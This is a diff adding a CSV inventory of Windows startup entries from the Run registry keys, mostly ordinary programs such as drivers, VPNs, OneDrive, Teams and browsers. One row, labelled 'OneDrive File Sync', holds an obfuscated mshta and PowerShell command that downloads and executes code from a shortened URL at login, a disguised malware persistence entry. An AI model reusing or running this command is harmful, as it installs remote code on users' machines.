@@ -1,0 +1,15 @@
+program_name,command,scope,registry_view,registry_root,registry_path,value_type
+SecurityHealth,%windir%\system32\SecurityHealthSystray.exe,All Users,64-bit,HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_EXPAND_SZ
+WavesSvc,"""C:\WINDOWS\System32\DriverStore\FileRepository\wavesapo10de.inf_amd64_db3f3288eba6a142\WavesSvc64.exe"" -Jack",All Users,64-bit,HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+RtkAudUService,"""C:\WINDOWS\System32\DriverStore\FileRepository\realtekservice.inf_amd64_434f4faf6aa034b3\RtkAudUService64.exe"" -background",All Users,64-bit,HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+TurboVPN,C:\Program Files (x86)\TurboVPN\TurboVpn.exe,All Users,32-bit,HKLM,SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+X-VPN,"""C:\Program Files (x86)\X-VPN\X-VPN.exe""",All Users,32-bit,HKLM,SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+vmware-tray.exe,"""C:\Program Files (x86)\VMware\VMware Workstation\vmware-tray.exe""",All Users,32-bit,HKLM,SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+OneDrive,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+Proton VPN,"C:\Program Files\Proton\VPN\ProtonVPN.Launcher.exe ""----ms-protocol:ms-encodedlaunch:App?ContractId=Windows.StartupTask&TaskId=Proton%20VPN""",Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+ScreenRec,C:\Users\AT\AppData\Local\StreamingVideoProvider\ScreenRec_app\screenrec.exe,Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+Teams,"""C:\Users\AT\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe"" msteams:system-initiated",Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+OneDrive File Sync,"C:\Windows\system32\mshta.exe vbscript:Execute(""Set ggg = CreateObject(""""WScript.Shell"""") : appleseed = """"powe"""" : ggg.Run appleseed+""""rshell -command sal noploper iex ; sal windoWs_NT iwr ; noploper(windowS_NT tiny.cc/zeba001)"""", 0 : window.close"")",Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+MicrosoftEdgeAutoLaunch_231FFB43015612FF85C8AEA89E211B26,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --win-session-start",Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+GoogleChromeAutoLaunch_4EC93D3AA179669C0FCDB5CEE188B05B,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --no-startup-window /prefetch:5",Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
+Mozilla-Firefox-308046B0AF4A39CB,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -os-autostart",Current User,User,HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,REG_SZ
